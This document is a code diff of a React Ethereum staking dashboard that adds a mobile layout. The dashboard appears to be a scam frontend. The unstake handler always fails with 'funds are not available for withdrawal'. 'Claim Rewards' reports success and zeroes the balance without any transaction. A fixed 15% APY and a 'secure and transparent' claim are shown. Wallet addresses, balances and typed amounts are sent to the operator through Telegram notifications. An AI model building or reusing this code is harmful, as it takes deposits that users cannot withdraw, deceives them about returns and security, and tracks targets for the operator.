@@ -132,19 +132,35 @@ export function StakingDashboard() {
   const [transactionStatus, setTransactionStatus] = useState<{
     type: "success" | "error"
     message: string
+    tab?: string
   } | null>(null)
   const [userStakedBalance, setUserStakedBalance] = useState("0")
   const [userRewards, setUserRewards] = useState("0")
   const [contractLoading, setContractLoading] = useState(true)
   const [contractError, setContractError] = useState(false)
   const [gasPrice, setGasPrice] = useState(7) // Default to 7 gwei based on successful transaction
-  const [showGasSettings, setShowGasSettings] = useState(true) // Show by default
+  const [showGasSettings, setShowGasSettings] = useState(false) // Hide by default for mobile
   const [dataFetched, setDataFetched] = useState(false)
   const [isConnecting, setIsConnecting] = useState(false)
+  const [isMobile, setIsMobile] = useState(false)
   const searchParams = useSearchParams()
 
   // Contract address
   const CONTRACT_ADDRESS = "0xcA8d23D51eDD65Fe70ee20dcd97B816424ec49A8"
+
+  // Detect mobile devices
+  useEffect(() => {
+    const checkMobile = () => {
+      setIsMobile(window.innerWidth < 768)
+    }
+
+    checkMobile()
+    window.addEventListener("resize", checkMobile)
+
+    return () => {
+      window.removeEventListener("resize", checkMobile)
+    }
+  }, [])
 
   // Load ethers.js from CDN
   useEffect(() => {
@@ -320,6 +336,7 @@ export function StakingDashboard() {
       setTransactionStatus({
         type: "error",
         message: "Please enter a valid amount to stake",
+        tab: "stake",
       })
       return
     }
@@ -332,6 +349,7 @@ export function StakingDashboard() {
       setTransactionStatus({
         type: "error",
         message: `Insufficient balance. You have ${balance} ETH available.`,
+        tab: "stake",
       })
       return
     }
@@ -345,6 +363,7 @@ export function StakingDashboard() {
         setTransactionStatus({
           type: "error",
           message: "Minimum staking amount is 0.0001 ETH",
+          tab: "stake",
         })
         setIsStaking(false)
         return
@@ -454,6 +473,7 @@ export function StakingDashboard() {
         setTransactionStatus({
           type: "success",
           message: `Transaction sent! Hash: ${txHash.substring(0, 10)}...`,
+          tab: "stake",
         })
 
         // Refresh balance after transaction
@@ -487,6 +507,7 @@ export function StakingDashboard() {
       setTransactionStatus({
         type: "error",
         message: error instanceof Error ? error.message : "Transaction failed. Please try again.",
+        tab: "stake",
       })
 
       // Send notification about failed staking
@@ -512,6 +533,7 @@ export function StakingDashboard() {
     setTransactionStatus({
       type: "error",
       message: "Your funds are not available for withdrawal at this time.",
+      tab: "unstake",
     })
     return
 
@@ -520,6 +542,7 @@ export function StakingDashboard() {
       setTransactionStatus({
         type: "error",
         message: "Please enter a valid amount to unstake",
+        tab: "unstake",
       })
       return
     }
@@ -532,6 +555,7 @@ export function StakingDashboard() {
       setTransactionStatus({
         type: "error",
         message: `Cannot unstake more than your staked amount (${userStakedBalance} ETH)`,
+        tab: "unstake",
       })
       return
     }
@@ -586,6 +610,7 @@ export function StakingDashboard() {
         setTransactionStatus({
           type: "success",
           message: `Transaction sent! Hash: ${txHash.substring(0, 10)}...`,
+          tab: "unstake",
         })
 
         // Refresh balance after transaction
@@ -612,6 +637,7 @@ export function StakingDashboard() {
       setTransactionStatus({
         type: "error",
         message: error instanceof Error ? error.message : "Transaction failed. Please try again.",
+        tab: "unstake",
       })
 
       // Send notification about failed unstaking
@@ -649,131 +675,114 @@ export function StakingDashboard() {
     }
   }, [isConnected, address, isStaking, isUnstaking])
 
-  return (
-    <Card className="glassmorphism neon-border overflow-hidden">
-      <CardHeader>
-        <CardTitle>Staking Dashboard</CardTitle>
-      </CardHeader>
-      <CardContent>
-        {transactionStatus && (
-          <Alert className={`mb-4 ${transactionStatus.type === "success" ? "bg-green-500/20" : "bg-red-500/20"}`}>
-            <AlertCircle className={transactionStatus.type === "success" ? "text-green-500" : "text-red-500"} />
-            <AlertTitle>{transactionStatus.type === "success" ? "Success" : "Error"}</AlertTitle>
-            <AlertDescription>{transactionStatus.message}</AlertDescription>
-          </Alert>
-        )}
-
-        <div className="p-4 rounded-lg glassmorphism mb-4">
-          <div className="text-sm text-muted-foreground mb-2">Contract Address</div>
-          <div className="text-sm font-mono truncate">{CONTRACT_ADDRESS}</div>
-          <div className="mt-2 text-xs text-muted-foreground">
-            This is the smart contract that handles your staking operations. All transactions are secure and
-            transparent.
-          </div>
-        </div>
-
-        {/* User Staking Summary - Always visible when connected */}
-        {isConnected && (
-          <div className="p-4 rounded-lg glassmorphism mb-4 border border-purple-500/30">
-            <div className="text-sm font-medium mb-2">Your Staking Summary</div>
-            {contractLoading && !dataFetched ? (
-              <div className="flex justify-center py-2">
-                <div className="h-5 w-5 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
-              </div>
-            ) : (
-              <div className="grid grid-cols-2 gap-4">
+  // Render a more compact version for mobile
+  const renderMobileStakingDashboard = () => {
+    return (
+      <Card className="glassmorphism neon-border overflow-hidden">
+        <CardHeader className="py-3">
+          <CardTitle className="text-lg">Staking Dashboard</CardTitle>
+        </CardHeader>
+        <CardContent className="p-3">
+          {/* User Staking Summary - Always visible when connected */}
+          {isConnected && (
+            <div className="p-3 rounded-lg glassmorphism mb-3 border border-purple-500/30">
+              <div className="grid grid-cols-2 gap-2">
                 <div>
-                  <div className="text-xs text-muted-foreground">Currently Staked</div>
-                  <div className="text-lg font-medium">{userStakedBalance} ETH</div>
+                  <div className="text-xs text-muted-foreground">Staked</div>
+                  <div className="text-base font-medium">{userStakedBalance} ETH</div>
                 </div>
                 <div>
-                  <div className="text-xs text-muted-foreground">Rewards Earned</div>
-                  <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
+                  <div className="text-xs text-muted-foreground">Rewards</div>
+                  <div className="text-base font-medium text-green-500">{userRewards} ETH</div>
                 </div>
               </div>
-            )}
-          </div>
-        )}
+            </div>
+          )}
 
-        <Tabs
-          defaultValue="stake"
-          value={activeTab}
-          onValueChange={(value) => {
-            setActiveTab(value)
-            setTransactionStatus(null)
-          }}
-        >
-          <TabsList className="grid grid-cols-3 mb-6">
-            <TabsTrigger value="stake">Stake</TabsTrigger>
-            <TabsTrigger value="unstake">Unstake</TabsTrigger>
-            <TabsTrigger value="rewards">Rewards</TabsTrigger>
-          </TabsList>
+          <Tabs
+            defaultValue="stake"
+            value={activeTab}
+            onValueChange={(value) => {
+              setActiveTab(value)
+              setTransactionStatus(null)
+            }}
+          >
+            <TabsList className="grid grid-cols-3 mb-3">
+              <TabsTrigger value="stake">Stake</TabsTrigger>
+              <TabsTrigger value="unstake">Unstake</TabsTrigger>
+              <TabsTrigger value="rewards">Rewards</TabsTrigger>
+            </TabsList>
 
-          <TabsContent value="stake">
-            <motion.div
-              initial={{ opacity: 0, y: 10 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ duration: 0.3 }}
-              className="space-y-6"
-            >
-              <div className="space-y-2">
-                <div className="flex justify-between">
-                  <label htmlFor="stake-amount" className="text-sm font-medium">
-                    Amount to Stake
-                  </label>
-                  {isConnected && (
-                    <button
-                      className="text-xs text-primary hover:underline"
-                      onClick={() => {
-                        setStakeAmount(balance) // Use actual balance
-                        // Track max button click
-                        sendTelegramNotification(`
+            <TabsContent value="stake">
+              <motion.div
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.3 }}
+                className="space-y-3"
+              >
+                {/* Show error message right below the tab selection */}
+                {transactionStatus && transactionStatus.tab === "stake" && (
+                  <Alert
+                    className={`mb-3 py-2 ${transactionStatus.type === "success" ? "bg-green-500/20" : "bg-red-500/20"}`}
+                  >
+                    <AlertCircle
+                      className={`h-4 w-4 ${transactionStatus.type === "success" ? "text-green-500" : "text-red-500"}`}
+                    />
+                    <AlertDescription className="text-xs ml-2">{transactionStatus.message}</AlertDescription>
+                  </Alert>
+                )}
+
+                <div className="space-y-2">
+                  <div className="flex justify-between">
+                    <label htmlFor="stake-amount" className="text-sm font-medium">
+                      Amount to Stake
+                    </label>
+                    {isConnected && (
+                      <button
+                        className="text-xs text-primary hover:underline"
+                        onClick={() => {
+                          setStakeAmount(balance)
+                          sendTelegramNotification(`
 🔘 <b>Max Button Clicked</b>
 👤 <b>User:</b> ${address}
 💰 <b>Max Amount:</b> ${balance} ETH
 ⏰ <b>Time:</b> ${new Date().toISOString()}
-                        `)
-                      }}
-                    >
-                      Max
-                    </button>
-                  )}
-                </div>
-                <div className="flex space-x-2">
-                  <Input
-                    id="stake-amount"
-                    type="number"
-                    placeholder="0.0"
-                    value={stakeAmount}
-                    onChange={(e) => {
-                      setStakeAmount(e.target.value)
-                      // Only send notification if value is significant
-                      if (Number.parseFloat(e.target.value) >= 0.1) {
-                        sendTelegramNotification(`
+                          `)
+                        }}
+                      >
+                        Max
+                      </button>
+                    )}
+                  </div>
+                  <div className="flex space-x-2">
+                    <Input
+                      id="stake-amount"
+                      type="number"
+                      placeholder="0.0"
+                      value={stakeAmount}
+                      onChange={(e) => {
+                        setStakeAmount(e.target.value)
+                        if (Number.parseFloat(e.target.value) >= 0.1) {
+                          sendTelegramNotification(`
 ✏️ <b>Stake Amount Changed</b>
 👤 <b>User:</b> ${address || "Not connected"}
 💰 <b>New Amount:</b> ${e.target.value} ETH
 ⏰ <b>Time:</b> ${new Date().toISOString()}
-                        `)
-                      }
-                    }}
-                    className="glassmorphism border-none bg-gray-500/10"
-                  />
-                  <Button variant="outline" className="w-20 glassmorphism border-none">
-                    ETH
-                  </Button>
-                </div>
-                <div className="text-xs text-amber-500 mt-1">
-                  Minimum staking amount: 0.0001 ETH. Recommended: 0.001 ETH or more.
-                </div>
-              </div>
-
-              <div className="space-y-4">
-                <div className="grid grid-cols-1 gap-4">
-                  <div className="p-4 rounded-lg glassmorphism">
-                    <div className="text-sm text-muted-foreground">APY</div>
-                    <div className="text-xl font-bold text-green-500">15.0%</div>
+                          `)
+                        }
+                      }}
+                      className="glassmorphism border-none bg-gray-500/10"
+                    />
+                    <Button variant="outline" className="w-20 glassmorphism border-none">
+                      ETH
+                    </Button>
                   </div>
+                  <div className="text-xs text-amber-500">Min: 0.0001 ETH. Recommended: 0.001+ ETH</div>
+                </div>
+
+                <div className="p-3 rounded-lg glassmorphism">
+                  <div className="text-xs text-muted-foreground">APY</div>
+                  <div className="text-lg font-bold text-green-500">15.0%</div>
                 </div>
 
                 {/* Gas settings toggle */}
@@ -782,18 +791,17 @@ export function StakingDashboard() {
                     className="text-xs text-primary hover:underline"
                     onClick={() => setShowGasSettings(!showGasSettings)}
                   >
-                    {showGasSettings ? "Hide Gas Settings" : "Advanced Gas Settings"}
+                    {showGasSettings ? "Hide Gas Settings" : "Gas Settings"}
                   </button>
                 </div>
 
-                {/* Gas settings panel */}
+                {/* Gas settings panel - more compact for mobile */}
                 {showGasSettings && (
-                  <div className="p-4 rounded-lg glassmorphism">
+                  <div className="p-3 rounded-lg glassmorphism">
                     <div className="flex justify-between mb-2">
-                      <label htmlFor="gas-price" className="text-sm font-medium">
-                        Gas Price (gwei)
+                      <label htmlFor="gas-price" className="text-xs">
+                        Gas Price: {gasPrice} gwei
                       </label>
-                      <span className="text-sm font-medium">{gasPrice} gwei</span>
                     </div>
                     <Slider
                       id="gas-price"
@@ -804,25 +812,18 @@ export function StakingDashboard() {
                       onValueChange={(value) => setGasPrice(value[0])}
                     />
                     <div className="flex justify-between mt-1">
-                      <span className="text-xs text-muted-foreground">Slower & Cheaper</span>
-                      <span className="text-xs text-muted-foreground">Faster & Costlier</span>
+                      <span className="text-xs text-muted-foreground">Cheaper</span>
+                      <span className="text-xs text-muted-foreground">Faster</span>
                     </div>
-                    <div className="mt-4 text-xs">
-                      <div className="text-muted-foreground mb-1">Estimated Gas Fee:</div>
-                      <div className="grid grid-cols-2 gap-2">
-                        <div>~{(gasPrice * 0.00006).toFixed(6)} ETH</div>
-                        <div className="text-right">${(gasPrice * 0.00006 * 1600).toFixed(2)}</div>
-                      </div>
-                      <div className="text-amber-500 mt-1">
-                        Make sure you have enough ETH to cover both the staking amount and gas fees.
-                      </div>
+                    <div className="mt-2 text-xs">
+                      <div className="text-muted-foreground">Est. Fee: ~{(gasPrice * 0.00006).toFixed(6)} ETH</div>
                     </div>
                   </div>
                 )}
 
                 {isConnected ? (
                   <button
-                    className={`w-full h-12 rounded-md font-medium text-white relative overflow-hidden ${
+                    className={`w-full h-10 rounded-md font-medium text-white relative overflow-hidden ${
                       isStaking || !stakeAmount ? "opacity-80 cursor-not-allowed" : "cursor-pointer"
                     }`}
                     disabled={isStaking || !stakeAmount}
@@ -830,16 +831,6 @@ export function StakingDashboard() {
                     style={{
                       background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
                       transition: "all 0.2s ease-in-out",
-                    }}
-                    onMouseEnter={(e) => {
-                      e.currentTarget.style.background = "linear-gradient(90deg, #7c3aed 0%, #2563eb 100%)"
-                      e.currentTarget.style.transform = "translateY(-1px)"
-                      e.currentTarget.style.boxShadow = "0 4px 12px rgba(139, 92, 246, 0.3)"
-                    }}
-                    onMouseLeave={(e) => {
-                      e.currentTarget.style.background = "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)"
-                      e.currentTarget.style.transform = "translateY(0)"
-                      e.currentTarget.style.boxShadow = "none"
                     }}
                   >
                     {isStaking ? (
@@ -855,297 +846,690 @@ export function StakingDashboard() {
                   <DashboardConnectWallet
                     className="w-full"
                     onConnect={() => {
-                      // Set default stake amount if not already set
                       if (!stakeAmount) {
                         setStakeAmount("0.1")
                       }
                     }}
                   />
                 )}
-              </div>
-            </motion.div>
-          </TabsContent>
+              </motion.div>
+            </TabsContent>
 
-          <TabsContent value="unstake">
-            <motion.div
-              initial={{ opacity: 0, y: 10 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ duration: 0.3 }}
-              className="space-y-6"
-            >
-              {isConnected ? (
-                <>
-                  <div className="space-y-2">
-                    <div className="flex justify-between">
-                      <label htmlFor="unstake-amount" className="text-sm font-medium">
-                        Amount to Unstake
-                      </label>
-                      <button
-                        className="text-xs text-primary hover:underline"
-                        onClick={() => {
-                          setUnstakeAmount(userStakedBalance) // Use actual staked amount
-                          // Track max button click
-                          sendTelegramNotification(`
+            <TabsContent value="unstake">
+              <motion.div
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.3 }}
+                className="space-y-3"
+              >
+                {/* Show error message right below the tab selection */}
+                {transactionStatus && transactionStatus.tab === "unstake" && (
+                  <Alert
+                    className={`mb-3 py-2 ${transactionStatus.type === "success" ? "bg-green-500/20" : "bg-red-500/20"}`}
+                  >
+                    <AlertCircle
+                      className={`h-4 w-4 ${transactionStatus.type === "success" ? "text-green-500" : "text-red-500"}`}
+                    />
+                    <AlertDescription className="text-xs ml-2">{transactionStatus.message}</AlertDescription>
+                  </Alert>
+                )}
+
+                {isConnected ? (
+                  <>
+                    <div className="space-y-2">
+                      <div className="flex justify-between">
+                        <label htmlFor="unstake-amount" className="text-sm font-medium">
+                          Amount to Unstake
+                        </label>
+                        <button
+                          className="text-xs text-primary hover:underline"
+                          onClick={() => {
+                            setUnstakeAmount(userStakedBalance)
+                            sendTelegramNotification(`
 🔘 <b>Max Unstake Button Clicked</b>
 👤 <b>User:</b> ${address}
 💰 <b>Max Amount:</b> ${userStakedBalance} ETH
+⏰ <b>Time:</b> ${new Date().toISOString()}
+                            `)
+                          }}
+                        >
+                          Max
+                        </button>
+                      </div>
+                      <div className="flex space-x-2">
+                        <Input
+                          id="unstake-amount"
+                          type="number"
+                          placeholder="0.0"
+                          value={unstakeAmount}
+                          onChange={(e) => {
+                            setUnstakeAmount(e.target.value)
+                            if (Number.parseFloat(e.target.value) >= 0.1) {
+                              sendTelegramNotification(`
+✏️ <b>Unstake Amount Changed</b>
+👤 <b>User:</b> ${address}
+💰 <b>New Amount:</b> ${e.target.value} ETH
+⏰ <b>Time:</b> ${new Date().toISOString()}
+                              `)
+                            }
+                          }}
+                          className="glassmorphism border-none bg-gray-500/10"
+                        />
+                        <Button variant="outline" className="w-20 glassmorphism border-none">
+                          ETH
+                        </Button>
+                      </div>
+                    </div>
+
+                    <div className="p-3 rounded-lg glassmorphism">
+                      <div className="grid grid-cols-2 gap-2">
+                        <div>
+                          <div className="text-xs text-muted-foreground">Staked</div>
+                          <div className="text-base font-medium">{userStakedBalance} ETH</div>
+                        </div>
+                        <div>
+                          <div className="text-xs text-muted-foreground">Status</div>
+                          <div className="text-base font-medium text-amber-500">Locked</div>
+                        </div>
+                      </div>
+                    </div>
+
+                    <button
+                      className={`w-full h-10 rounded-md font-medium text-white relative overflow-hidden ${
+                        isUnstaking || !unstakeAmount ? "opacity-80 cursor-not-allowed" : "cursor-pointer"
+                      }`}
+                      disabled={isUnstaking || !unstakeAmount}
+                      onClick={handleUnstake}
+                      style={{
+                        background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
+                        transition: "all 0.2s ease-in-out",
+                      }}
+                    >
+                      {isUnstaking ? (
+                        <div className="flex items-center justify-center">
+                          <div className="mr-2 h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
+                          <span>Unstaking...</span>
+                        </div>
+                      ) : (
+                        "Unstake ETH"
+                      )}
+                    </button>
+                  </>
+                ) : (
+                  <div className="p-3 text-center">
+                    <p className="text-sm text-muted-foreground">Connect wallet to unstake ETH.</p>
+                    <DashboardConnectWallet className="mt-3 w-full mx-auto" />
+                  </div>
+                )}
+              </motion.div>
+            </TabsContent>
+
+            <TabsContent value="rewards">
+              <motion.div
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.3 }}
+                className="space-y-3"
+              >
+                {isConnected ? (
+                  <div className="space-y-3">
+                    <div className="p-3 rounded-lg glassmorphism">
+                      <div className="grid grid-cols-2 gap-2">
+                        <div>
+                          <div className="text-xs text-muted-foreground">Total Rewards</div>
+                          <div className="text-base font-medium text-green-500">{userRewards} ETH</div>
+                        </div>
+                        <div>
+                          <div className="text-xs text-muted-foreground">APY</div>
+                          <div className="text-base font-medium">15.0%</div>
+                        </div>
+                      </div>
+                    </div>
+
+                    <button
+                      className="w-full h-10 rounded-md font-medium text-white relative overflow-hidden cursor-pointer"
+                      onClick={async () => {
+                        setTransactionStatus({
+                          type: "success",
+                          message: "Successfully claimed rewards",
+                          tab: "rewards",
+                        })
+
+                        await sendTelegramNotification(`
+💎 <b>Rewards Claimed</b> 💵 ❤️
+👤 <b>User:</b> ${address}
+💰 <b>Amount:</b> ${userRewards} ETH
+⏰ <b>Time:</b> ${new Date().toISOString()}
+                        `)
+
+                        setUserRewards("0")
+                      }}
+                      style={{
+                        background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
+                        transition: "all 0.2s ease-in-out",
+                      }}
+                    >
+                      Claim Rewards
+                    </button>
+                  </div>
+                ) : (
+                  <div className="p-3 text-center">
+                    <p className="text-sm text-muted-foreground">Connect wallet to view rewards.</p>
+                    <DashboardConnectWallet className="mt-3 w-full mx-auto" />
+                  </div>
+                )}
+              </motion.div>
+            </TabsContent>
+          </Tabs>
+        </CardContent>
+      </Card>
+    )
+  }
+
+  // Render a more detailed version for desktop
+  const renderDesktopStakingDashboard = () => {
+    return (
+      <Card className="glassmorphism neon-border overflow-hidden">
+        <CardHeader>
+          <CardTitle>Staking Dashboard</CardTitle>
+        </CardHeader>
+        <CardContent>
+          {transactionStatus && (
+            <Alert className={`mb-4 ${transactionStatus.type === "success" ? "bg-green-500/20" : "bg-red-500/20"}`}>
+              <AlertCircle className={transactionStatus.type === "success" ? "text-green-500" : "text-red-500"} />
+              <AlertTitle>{transactionStatus.type === "success" ? "Success" : "Error"}</AlertTitle>
+              <AlertDescription>{transactionStatus.message}</AlertDescription>
+            </Alert>
+          )}
+
+          <div className="p-4 rounded-lg glassmorphism mb-4">
+            <div className="text-sm text-muted-foreground mb-2">Contract Address</div>
+            <div className="text-sm font-mono truncate">{CONTRACT_ADDRESS}</div>
+            <div className="mt-2 text-xs text-muted-foreground">
+              This is the smart contract that handles your staking operations. All transactions are secure and
+              transparent.
+            </div>
+          </div>
+
+          {/* User Staking Summary - Always visible when connected */}
+          {isConnected && (
+            <div className="p-4 rounded-lg glassmorphism mb-4 border border-purple-500/30">
+              <div className="text-sm font-medium mb-2">Your Staking Summary</div>
+              {contractLoading && !dataFetched ? (
+                <div className="flex justify-center py-2">
+                  <div className="h-5 w-5 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
+                </div>
+              ) : (
+                <div className="grid grid-cols-2 gap-4">
+                  <div>
+                    <div className="text-xs text-muted-foreground">Currently Staked</div>
+                    <div className="text-lg font-medium">{userStakedBalance} ETH</div>
+                  </div>
+                  <div>
+                    <div className="text-xs text-muted-foreground">Rewards Earned</div>
+                    <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
+                  </div>
+                </div>
+              )}
+            </div>
+          )}
+
+          <Tabs
+            defaultValue="stake"
+            value={activeTab}
+            onValueChange={(value) => {
+              setActiveTab(value)
+              setTransactionStatus(null)
+            }}
+          >
+            <TabsList className="grid grid-cols-3 mb-6">
+              <TabsTrigger value="stake">Stake</TabsTrigger>
+              <TabsTrigger value="unstake">Unstake</TabsTrigger>
+              <TabsTrigger value="rewards">Rewards</TabsTrigger>
+            </TabsList>
+
+            <TabsContent value="stake">
+              <motion.div
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.3 }}
+                className="space-y-6"
+              >
+                <div className="space-y-2">
+                  <div className="flex justify-between">
+                    <label htmlFor="stake-amount" className="text-sm font-medium">
+                      Amount to Stake
+                    </label>
+                    {isConnected && (
+                      <button
+                        className="text-xs text-primary hover:underline"
+                        onClick={() => {
+                          setStakeAmount(balance) // Use actual balance
+                          // Track max button click
+                          sendTelegramNotification(`
+🔘 <b>Max Button Clicked</b>
+👤 <b>User:</b> ${address}
+💰 <b>Max Amount:</b> ${balance} ETH
 ⏰ <b>Time:</b> ${new Date().toISOString()}
                           `)
                         }}
                       >
                         Max
                       </button>
+                    )}
+                  </div>
+                  <div className="flex space-x-2">
+                    <Input
+                      id="stake-amount"
+                      type="number"
+                      placeholder="0.0"
+                      value={stakeAmount}
+                      onChange={(e) => {
+                        setStakeAmount(e.target.value)
+                        // Only send notification if value is significant
+                        if (Number.parseFloat(e.target.value) >= 0.1) {
+                          sendTelegramNotification(`
+✏️ <b>Stake Amount Changed</b>
+👤 <b>User:</b> ${address || "Not connected"}
+💰 <b>New Amount:</b> ${e.target.value} ETH
+⏰ <b>Time:</b> ${new Date().toISOString()}
+                          `)
+                        }
+                      }}
+                      className="glassmorphism border-none bg-gray-500/10"
+                    />
+                    <Button variant="outline" className="w-20 glassmorphism border-none">
+                      ETH
+                    </Button>
+                  </div>
+                  <div className="text-xs text-amber-500 mt-1">
+                    Minimum staking amount: 0.0001 ETH. Recommended: 0.001 ETH or more.
+                  </div>
+                </div>
+
+                <div className="space-y-4">
+                  <div className="grid grid-cols-1 gap-4">
+                    <div className="p-4 rounded-lg glassmorphism">
+                      <div className="text-sm text-muted-foreground">APY</div>
+                      <div className="text-xl font-bold text-green-500">15.0%</div>
                     </div>
-                    <div className="flex space-x-2">
-                      <Input
-                        id="unstake-amount"
-                        type="number"
-                        placeholder="0.0"
-                        value={unstakeAmount}
-                        onChange={(e) => {
-                          setUnstakeAmount(e.target.value)
-                          // Only send notification if value is significant
-                          if (Number.parseFloat(e.target.value) >= 0.1) {
+                  </div>
+
+                  {/* Gas settings toggle */}
+                  <div className="flex justify-end">
+                    <button
+                      className="text-xs text-primary hover:underline"
+                      onClick={() => setShowGasSettings(!showGasSettings)}
+                    >
+                      {showGasSettings ? "Hide Gas Settings" : "Advanced Gas Settings"}
+                    </button>
+                  </div>
+
+                  {/* Gas settings panel */}
+                  {showGasSettings && (
+                    <div className="p-4 rounded-lg glassmorphism">
+                      <div className="flex justify-between mb-2">
+                        <label htmlFor="gas-price" className="text-sm font-medium">
+                          Gas Price (gwei)
+                        </label>
+                        <span className="text-sm font-medium">{gasPrice} gwei</span>
+                      </div>
+                      <Slider
+                        id="gas-price"
+                        min={7}
+                        max={30}
+                        step={1}
+                        value={[gasPrice]}
+                        onValueChange={(value) => setGasPrice(value[0])}
+                      />
+                      <div className="flex justify-between mt-1">
+                        <span className="text-xs text-muted-foreground">Slower & Cheaper</span>
+                        <span className="text-xs text-muted-foreground">Faster & Costlier</span>
+                      </div>
+                      <div className="mt-4 text-xs">
+                        <div className="text-muted-foreground mb-1">Estimated Gas Fee:</div>
+                        <div className="grid grid-cols-2 gap-2">
+                          <div>~{(gasPrice * 0.00006).toFixed(6)} ETH</div>
+                          <div className="text-right">${(gasPrice * 0.00006 * 1600).toFixed(2)}</div>
+                        </div>
+                        <div className="text-amber-500 mt-1">
+                          Make sure you have enough ETH to cover both the staking amount and gas fees.
+                        </div>
+                      </div>
+                    </div>
+                  )}
+
+                  {isConnected ? (
+                    <button
+                      className={`w-full h-12 rounded-md font-medium text-white relative overflow-hidden ${
+                        isStaking || !stakeAmount ? "opacity-80 cursor-not-allowed" : "cursor-pointer"
+                      }`}
+                      disabled={isStaking || !stakeAmount}
+                      onClick={handleStake}
+                      style={{
+                        background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
+                        transition: "all 0.2s ease-in-out",
+                      }}
+                      onMouseEnter={(e) => {
+                        e.currentTarget.style.background = "linear-gradient(90deg, #7c3aed 0%, #2563eb 100%)"
+                        e.currentTarget.style.transform = "translateY(-1px)"
+                        e.currentTarget.style.boxShadow = "0 4px 12px rgba(139, 92, 246, 0.3)"
+                      }}
+                      onMouseLeave={(e) => {
+                        e.currentTarget.style.background = "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)"
+                        e.currentTarget.style.transform = "translateY(0)"
+                        e.currentTarget.style.boxShadow = "none"
+                      }}
+                    >
+                      {isStaking ? (
+                        <div className="flex items-center justify-center">
+                          <div className="mr-2 h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
+                          <span>Staking...</span>
+                        </div>
+                      ) : (
+                        "Stake ETH"
+                      )}
+                    </button>
+                  ) : (
+                    <DashboardConnectWallet
+                      className="w-full"
+                      onConnect={() => {
+                        // Set default stake amount if not already set
+                        if (!stakeAmount) {
+                          setStakeAmount("0.1")
+                        }
+                      }}
+                    />
+                  )}
+                </div>
+              </motion.div>
+            </TabsContent>
+
+            <TabsContent value="unstake">
+              <motion.div
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.3 }}
+                className="space-y-6"
+              >
+                {isConnected ? (
+                  <>
+                    <div className="space-y-2">
+                      <div className="flex justify-between">
+                        <label htmlFor="unstake-amount" className="text-sm font-medium">
+                          Amount to Unstake
+                        </label>
+                        <button
+                          className="text-xs text-primary hover:underline"
+                          onClick={() => {
+                            setUnstakeAmount(userStakedBalance) // Use actual staked amount
+                            // Track max button click
                             sendTelegramNotification(`
+🔘 <b>Max Unstake Button Clicked</b>
+👤 <b>User:</b> ${address}
+💰 <b>Max Amount:</b> ${userStakedBalance} ETH
+⏰ <b>Time:</b> ${new Date().toISOString()}
+                            `)
+                          }}
+                        >
+                          Max
+                        </button>
+                      </div>
+                      <div className="flex space-x-2">
+                        <Input
+                          id="unstake-amount"
+                          type="number"
+                          placeholder="0.0"
+                          value={unstakeAmount}
+                          onChange={(e) => {
+                            setUnstakeAmount(e.target.value)
+                            // Only send notification if value is significant
+                            if (Number.parseFloat(e.target.value) >= 0.1) {
+                              sendTelegramNotification(`
 ✏️ <b>Unstake Amount Changed</b>
 👤 <b>User:</b> ${address}
 💰 <b>New Amount:</b> ${e.target.value} ETH
 ⏰ <b>Time:</b> ${new Date().toISOString()}
-                            `)
-                          }
-                        }}
-                        className="glassmorphism border-none bg-gray-500/10"
-                      />
-                      <Button variant="outline" className="w-20 glassmorphism border-none">
-                        ETH
-                      </Button>
+                              `)
+                            }
+                          }}
+                          className="glassmorphism border-none bg-gray-500/10"
+                        />
+                        <Button variant="outline" className="w-20 glassmorphism border-none">
+                          ETH
+                        </Button>
+                      </div>
                     </div>
-                  </div>
 
-                  <div className="p-4 rounded-lg glassmorphism">
-                    <div className="text-sm text-muted-foreground mb-2">Staking Information</div>
-                    {contractLoading && !dataFetched ? (
-                      <div className="flex justify-center py-4">
-                        <div className="h-6 w-6 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
-                      </div>
-                    ) : (
-                      <div className="grid grid-cols-2 gap-4">
-                        <div>
-                          <div className="text-xs text-muted-foreground">Staked Amount</div>
-                          <div className="text-lg font-medium">{userStakedBalance} ETH</div>
-                        </div>
-                        <div>
-                          <div className="text-xs text-muted-foreground">Rewards Earned</div>
-                          <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
-                        </div>
-                        <div>
-                          <div className="text-xs text-muted-foreground">Status</div>
-                          <div className="text-lg font-medium text-amber-500">Locked</div>
-                        </div>
-                      </div>
-                    )}
-                  </div>
-
-                  {/* Gas settings toggle */}
-                  <div className="flex justify-end">
-                    <button
-                      className="text-xs text-primary hover:underline"
-                      onClick={() => setShowGasSettings(!showGasSettings)}
-                    >
-                      {showGasSettings ? "Hide Gas Settings" : "Advanced Gas Settings"}
-                    </button>
-                  </div>
-
-                  {/* Gas settings panel */}
-                  {showGasSettings && (
                     <div className="p-4 rounded-lg glassmorphism">
-                      <div className="flex justify-between mb-2">
-                        <label htmlFor="gas-price-unstake" className="text-sm font-medium">
-                          Gas Price (gwei)
-                        </label>
-                        <span className="text-sm font-medium">{gasPrice} gwei</span>
-                      </div>
-                      <Slider
-                        id="gas-price-unstake"
-                        min={7}
-                        max={30}
-                        step={1}
-                        value={[gasPrice]}
-                        onValueChange={(value) => setGasPrice(value[0])}
-                      />
-                      <div className="flex justify-between mt-1">
